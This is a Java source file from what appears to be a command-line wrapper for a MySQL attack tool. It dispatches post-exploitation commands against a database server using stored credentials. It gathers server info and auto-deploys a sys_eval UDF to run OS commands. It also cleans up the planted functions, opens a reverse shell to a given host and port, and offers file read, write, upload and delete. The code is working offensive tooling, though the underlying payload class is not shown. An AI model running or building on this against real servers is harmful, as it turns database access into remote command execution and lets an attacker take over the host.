package cli.dispatcher;

import cli.Args;
import cli.Ctx;
import cli.Result;
import Dao.MysqlDao;
import org.json.JSONObject;

import java.util.Map;

/**
 * MySQL 分发：info / exec（UDF 自动部署链）/ sql / clean / revshell；文件操作 M3a。
 */
public class MysqlDispatcher extends BaseDispatcher {

    @Override
    public String dbType() {
        return "mysql";
    }

    @Override
    public Result handle(String tool, Args.Parsed p, Ctx ctx) throws Exception {
        String id = flag(p, "id", "");
        Map<String, String> rec = loadConn(ctx, id, dbType());
        String code = ctx.enc.isEmpty() ? "UTF-8" : ctx.enc;
        MysqlDao dao = new MysqlDao(rec.get("ipaddress"), rec.get("port"), rec.get("database"),
                rec.get("username"), rec.get("password"), String.valueOf(ctx.timeoutSec));
        dao.setReporter(ctx.reporter);

        if ("sql".equals(tool)) {
            dao.getConnection();
            return Result.ok(dao.runSql(p.positionals.get(0), code)).withId(id);
        }
        if ("info".equals(tool)) {
            dao.getConnection();
            dao.getInfo();
            JSONObject d = new JSONObject();
            d.put("version", nz(dao.getVersion()));
            d.put("os", nz(dao.getMysqlPlatform()));
            d.put("arch", nz(dao.getSystemPlatform()));
            d.put("plugin_dir", nz(dao.getRemoteOutfile()));
            d.put("sys_eval_exists", dao.sysEvalExists());
            return Result.ok("MySQL " + nz(dao.getVersion()) + " / " + nz(dao.getMysqlPlatform())
                    + " / " + nz(dao.getSystemPlatform()), d).withId(id);
        }
        if ("exec".equals(tool)) {
            String cmd = p.positionals.get(0);
            dao.getConnection();
            String res = dao.eval(cmd, code);
            if (!dao.sysEvalExists()) {
                // 自动部署链（docs/3 §3.2）：getInfo→initUDF→udf(sys_eval) 后重试一次
                ctx.reporter.log("[mdut] sys_eval 未部署，自动执行 UDF 部署链...");
                dao.getInfo();
                dao.udf("sys_eval");
                res = dao.eval(cmd, code);
            }
            return Result.ok(res).withId(id);
        }
        if ("clean".equals(tool)) {
            dao.getConnection();
            dao.getInfo();
            dao.cleanudf();
            return Result.ok("clean 完成（drop sys_eval/backshell + 删除 *.temp）").withId(id);
        }
        if ("revshell".equals(tool)) {
            dao.getConnection();
            dao.getInfo();
            if (dao.getMysqlPlatform() != null && !dao.getMysqlPlatform().startsWith("Win")) {
                ctx.reporter.log("[mdut] 警告: backshell 为 Windows DLL 路线，Linux 目标建议直接 exec");
            }
            dao.reverseShell(p.positionals.get(0), p.positionals.get(1), code);
            return Result.ok("revshell 已发起（回连 " + p.positionals.get(0) + ":" + p.positionals.get(1) + "）").withId(id);
        }
        // 文件操作 M3a
        if ("list-files".equals(tool) || "read".equals(tool) || "write".equals(tool)
                || "upload".equals(tool) || "download".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
            return m3a(tool, dbType()).withId(id);
        }
        return Result.usage("mysql 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
    }

    private static String nz(String s) {
        return s == null ? "" : s;
    }
}
